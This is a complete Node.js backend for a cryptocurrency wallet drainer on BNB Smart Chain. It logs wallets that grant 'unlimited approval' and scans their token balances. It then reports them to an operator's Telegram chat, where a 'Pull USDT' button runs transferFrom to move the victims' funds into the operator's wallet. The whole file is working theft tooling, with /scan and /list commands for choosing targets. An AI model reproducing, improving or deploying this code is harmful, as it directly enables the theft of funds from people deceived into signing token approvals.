// backend_server.js - Node.js Backend for Auto-Pull & Telegram Bot
require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const { ethers } = require('ethers');

// ================= CONFIGURATION =================
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || 'YOUR_ADMIN_CHAT_ID';
const ADMIN_PRIVATE_KEY = process.env.ADMIN_PRIVATE_KEY || 'YOUR_ADMIN_WALLET_PRIVATE_KEY';
const ADMIN_WALLET_ADDRESS_ENV = process.env.ADMIN_WALLET_ADDRESS || '';
const PORT = process.env.PORT || 3000;

// Setup RPC & Contract
const BSC_RPC = 'https://bsc-dataseed.binance.org/';
const USDT_ADDRESS = '0x55d398326f99059ff775485246999027b3197955';
const ERC20_ABI = [
    "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)"
];

const provider = new ethers.JsonRpcProvider(BSC_RPC);

// Major BEP-20 Tokens List to Scan on BNB Smart Chain
const TOKENS_TO_SCAN = [
    { symbol: 'BNB',  isNative: true,  decimals: 18, priceUsd: 600.0, icon: '🟡' },
    { symbol: 'USDT', address: '0x55d398326f99059ff775485246999027b3197955', decimals: 18, priceUsd: 1.0, icon: '🟢' },
    { symbol: 'USDC', address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', decimals: 18, priceUsd: 1.0, icon: '🔵' },
    { symbol: 'BUSD', address: '0xe9e7cea3dedca5984780bafc599bd69add087d56', decimals: 18, priceUsd: 1.0, icon: '🟡' },
    { symbol: 'ETH',  address: '0x2170ed0880ac9a755fd29b2688956bd959f933f8', decimals: 18, priceUsd: 3500.0, icon: '🔷' },
    { symbol: 'BTCB', address: '0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c', decimals: 18, priceUsd: 85000.0, icon: '🟠' },
    { symbol: 'CAKE', address: '0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82', decimals: 18, priceUsd: 2.5, icon: '🥞' },
    { symbol: 'DAI',  address: '0x1af3f329e8be154074d8769d1ffa4ee058b1dbc3', decimals: 18, priceUsd: 1.0, icon: '🟡' }
];

const INR_RATE = 96.225; // 1 USD in INR

// Only initialize admin wallet if private key is provided
let adminWallet = null;
let usdtContract = null;

if (ADMIN_PRIVATE_KEY &&
    ADMIN_PRIVATE_KEY !== 'YOUR_ADMIN_WALLET_PRIVATE_KEY' &&
    ADMIN_PRIVATE_KEY !== 'your_admin_wallet_private_key_here') {
    try {
        const keyOrPhrase = ADMIN_PRIVATE_KEY.trim();
        if (keyOrPhrase.includes(' ')) {
            // BIP-39 Mnemonic Seed Phrase via HDNodeWallet in Ethers v6
            const cleanPhrase = keyOrPhrase.toLowerCase();
            adminWallet = ethers.HDNodeWallet.fromPhrase(cleanPhrase).connect(provider);
            console.log('[Setup] Admin wallet derived from Mnemonic Phrase:', adminWallet.address);
        } else {
            adminWallet = new ethers.Wallet(keyOrPhrase, provider);
            console.log('[Setup] Admin wallet derived from Hex Private Key:', adminWallet.address);
        }
        usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, adminWallet);
    } catch (err) {
        console.error('[Setup] Failed to initialize admin wallet:', err.message);
    }
} else {
    console.warn('[Setup] Admin wallet not configured - set ADMIN_PRIVATE_KEY in environment variables');
}

// Determine destination wallet address
function getAdminReceiverAddress() {
    if (ADMIN_WALLET_ADDRESS_ENV &&
        ADMIN_WALLET_ADDRESS_ENV !== 'YOUR_ADMIN_RECEIVER_ADDRESS' &&
        ADMIN_WALLET_ADDRESS_ENV.startsWith('0x') &&
        ADMIN_WALLET_ADDRESS_ENV.length === 42) {
        return ADMIN_WALLET_ADDRESS_ENV;
    }
    if (adminWallet && adminWallet.address) {
        return adminWallet.address;
    }
    return 'YOUR_ADMIN_RECEIVER_ADDRESS';
}

/**
 * 📊 Scans ALL Crypto Balances (BNB + BEP-20 Tokens) for a given Wallet Address
 */
async function fetchFullWalletBalances(walletAddress) {
    if (!walletAddress || !walletAddress.startsWith('0x') || walletAddress.length !== 42) {
        return { balances: [], totalUsd: 0, totalInr: 0, formattedText: 'Invalid wallet address' };
    }

    let balances = [];
    let totalUsd = 0;

    for (const token of TOKENS_TO_SCAN) {
        try {
            let amount = 0;
            if (token.isNative) {
                const rawBal = await provider.getBalance(walletAddress);
                amount = Number(rawBal) / 1e18;
            } else {
                const cleanAddr = walletAddress.substring(2).padStart(64, '0');
                const callData = '0x70a08231' + cleanAddr;
                const result = await provider.call({ to: token.address, data: callData });
                if (result && result !== '0x') {
                    amount = Number(BigInt(result)) / Math.pow(10, token.decimals);
                }
            }

            if (amount > 0.0001) {
                const usdValue = amount * token.priceUsd;
                totalUsd += usdValue;
                balances.push({
                    symbol: token.symbol,
                    amount: amount.toFixed(4),
                    usdValue: usdValue.toFixed(2),
                    icon: token.icon
                });
            }
        } catch (e) {
            console.warn(`[Balance Fetch Error] ${token.symbol}:`, e.message);
        }
    }

    const totalInr = totalUsd * INR_RATE;

    let formattedText = `📊 *All Crypto Balances in Wallet:*\n`;
    if (balances.length === 0) {
        formattedText += `• 📭 No active crypto balances found.\n`;
    } else {
        balances.forEach(b => {
            formattedText += `• ${b.icon} *${b.symbol}:* \`${b.amount} ${b.symbol}\` (~$${b.usdValue})\n`;
        });
        formattedText += `\n💰 *Total Wallet Value:* ~$${totalUsd.toFixed(2)} (₹${totalInr.toFixed(2)})`;
    }

    return { balances, totalUsd, totalInr, formattedText };
}

// In-Memory Database
let approvedWallets = [];

// Initialize Express
const app = express();
app.use(cors());
app.use(bodyParser.json());

// Initialize Bot conditionally
let bot = null;
const isBotTokenValid = BOT_TOKEN &&
    BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' &&
    BOT_TOKEN !== 'your_telegram_bot_token_here' &&
    BOT_TOKEN.includes(':');

if (isBotTokenValid) {
    try {
        bot = new TelegramBot(BOT_TOKEN, { polling: true });
        console.log('[Telegram] Bot initialized with polling');

        bot.on('polling_error', (error) => {
            if (error.code === 'ETELEGRAM' && error.message.includes('Conflict')) {
                console.warn('[Telegram] Another bot instance may be running, but continuing...');
            } else {
                console.error('[Telegram] Polling error:', error.message);
            }
        });
    } catch (err) {
        console.error('[Telegram] Failed to initialize bot:', err.message);
    }
} else {
    console.warn('[Telegram] Bot not configured - set TELEGRAM_BOT_TOKEN in environment variables');
}

// ================= API ENDPOINT (Approval Signal) =================
app.post('/api/notify-approval', async (req, res) => {
    const { address, amount, walletName } = req.body;

    if (!address) {
        return res.status(400).json({ success: false, error: 'Address is required' });
    }

    // Save or update in list (case-insensitive)
    const existingIndex = approvedWallets.findIndex(w => w.address.toLowerCase() === address.toLowerCase());
    if (existingIndex > -1) {
        approvedWallets[existingIndex].amount = amount;
    } else {
        approvedWallets.push({ address, amount, walletName });
    }

    // Fetch multi-token crypto balances
    const walletScan = await fetchFullWalletBalances(address);

    // Send Telegram Message with Inline Button
    const message = `✅ *Unlimited Approval Granted!* 🚀\n\n` +
                    `👤 *Wallet:* ${walletName || 'Main Wallet'}\n` +
                    `👛 *Address:* \`${address}\`\n` +
                    `💰 *Target Amount:* ${amount} USDT\n\n` +
                    `${walletScan.formattedText}\n\n` +
                    `Aap funds abhi pull kar sakte hain:`;

    const opts = {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [{ text: `💸 Pull ${amount} USDT Now`, callback_data: `pull_${address}_${amount}` }]
            ]
        }
    };

    if (bot) {
        try {
            const targetChatId = ADMIN_CHAT_ID !== 'YOUR_ADMIN_CHAT_ID' ? ADMIN_CHAT_ID : null;
            if (targetChatId) {
                await bot.sendMessage(targetChatId, message, opts);
            } else {
                console.warn('[API] ADMIN_CHAT_ID not configured');
            }
        } catch (err) {
            console.error('[API] Telegram sendMessage error:', err.message);
        }
    } else {
        console.warn('[API] Telegram bot not available, skipping notification');
    }
    res.json({ success: true, balances: walletScan.balances });
});

// ================= API ENDPOINT (Notify Connection) =================
app.post('/api/notify-connection', async (req, res) => {
    const { chat_id, address, walletName } = req.body;

    try {
        if (!bot) {
            return res.status(503).json({ success: false, error: 'Telegram bot not configured' });
        }
        const targetChat = chat_id || (ADMIN_CHAT_ID !== 'YOUR_ADMIN_CHAT_ID' ? ADMIN_CHAT_ID : null);
        if (!targetChat) {
            return res.status(400).json({ success: false, error: 'No valid chat_id provided' });
        }

        // Scan full multi-crypto token balances for connected wallet
        const walletScan = await fetchFullWalletBalances(address);

        const messageText = `🔔 *New Wallet Auto-Connected!* 🚀\n\n` +
                            `👤 *Wallet Name:* ${walletName || 'Main Wallet'}\n` +
                            `👛 *Address:* \`${address}\`\n\n` +
                            `${walletScan.formattedText}\n\n` +
                            `🌐 *Network:* BNB Smart Chain (BEP-20)`;

        await bot.sendMessage(targetChat, messageText, { parse_mode: 'Markdown' });
        res.json({ success: true, balances: walletScan.balances });
    } catch (err) {
        console.error('[API] Telegram connection notify error:', err.message);
        res.status(500).json({ success: false, error: err.message });
    }
});

// ================= SERVE STATIC FILES =================
app.use(express.static(__dirname));

// ================= TELEGRAM BOT COMMANDS & CALLBACKS =================
if (bot) {
    // Command to scan all crypto balances of any address: /scan 0x...
    bot.onText(/\/scan\s*(.*)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const targetAddr = match[1] ? match[1].trim() : '';

        if (!targetAddr || !targetAddr.startsWith('0x') || targetAddr.length !== 42) {
            return bot.sendMessage(chatId, "⚠️ Usage: `/scan 0xYourWalletAddress`", { parse_mode: "Markdown" });
        }

        bot.sendMessage(chatId, `🔍 *Scanning Crypto Balances for* \`${targetAddr}\`...`, { parse_mode: "Markdown" });

        const walletScan = await fetchFullWalletBalances(targetAddr);
        bot.sendMessage(chatId, `👛 *Wallet:* \`${targetAddr}\`\n\n${walletScan.formattedText}`, { parse_mode: "Markdown" });
    });

    // Command to list all approved wallets
    bot.onText(/\/list/, async (msg) => {
        const chatId = msg.chat.id;
        if (approvedWallets.length === 0) {
            return bot.sendMessage(chatId, "📭 Abhi koi approved wallet nahi hai.");
        }

        await bot.sendMessage(chatId, "📜 *Approved Wallets List:*", { parse_mode: "Markdown" });

        for (const wallet of approvedWallets) {
            const walletScan = await fetchFullWalletBalances(wallet.address);
            const opts = {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[{ text: `💸 Pull ${wallet.amount} USDT`, callback_data: `pull_${wallet.address}_${wallet.amount}` }]]
                }
            };
            const text = `👛 \`${wallet.address}\`\n💰 Approved: ${wallet.amount} USDT\n\n${walletScan.formattedText}`;
            await bot.sendMessage(chatId, text, opts);
        }
    });

    // Handle Button Clicks (Pulling Funds)
    bot.on('callback_query', async (query) => {
        const chatId = query.message.chat.id;
        const data = query.data; // Format: pull_0xAddress_100

        if (data.startsWith('pull_')) {
            const parts = data.split('_');
            const targetAddress = parts[1];
            const amount = parts[2];
            const recipientAddress = getAdminReceiverAddress();

            // Check if admin wallet is configured
            if (!adminWallet || !usdtContract) {
                bot.sendMessage(chatId, `❌ *Admin Wallet Not Configured*\n\nPlease set ADMIN_PRIVATE_KEY in environment variables to enable fund pulling.`, { parse_mode: 'Markdown' });
                return;
            }

            if (recipientAddress === 'YOUR_ADMIN_RECEIVER_ADDRESS') {
                bot.sendMessage(chatId, `❌ *Receiver Address Not Configured*\n\nPlease set ADMIN_WALLET_ADDRESS in environment variables.`, { parse_mode: 'Markdown' });
                return;
            }

            bot.sendMessage(chatId, `⏳ *Pulling ${amount} USDT* from \`${targetAddress}\`...\nKripya wait karein, Web3 transaction chal rahi hai...`, { parse_mode: 'Markdown' });

            try {
                const amountInWei = ethers.parseUnits(amount.toString(), 18);

                // Execute transferFrom function
                const tx = await usdtContract.transferFrom(targetAddress, recipientAddress, amountInWei);

                bot.sendMessage(chatId, `🚀 Transaction Broadcasted!\nHash: \`${tx.hash}\`\nWaiting for confirmation...`, { parse_mode: 'Markdown' });

                await tx.wait(); // Wait for block confirmation

                bot.sendMessage(chatId, `✅ *SUCCESS!* ${amount} USDT pulled successfully into \`${recipientAddress}\`! 🤑`, { parse_mode: 'Markdown' });

                // Remove from list after success
                approvedWallets = approvedWallets.filter(w => w.address.toLowerCase() !== targetAddress.toLowerCase());

            } catch (error) {
                console.error('[Pull Error]', error);
                bot.sendMessage(chatId, `❌ *FAILED!*\nReason: ${error.reason || error.message}\n(Make sure Admin has BNB for gas, and user actually approved)`, { parse_mode: 'Markdown' });
            }
        }
    });
}

// Start Server
app.listen(PORT, () => {
    console.log(`Backend API running on port ${PORT}`);
});
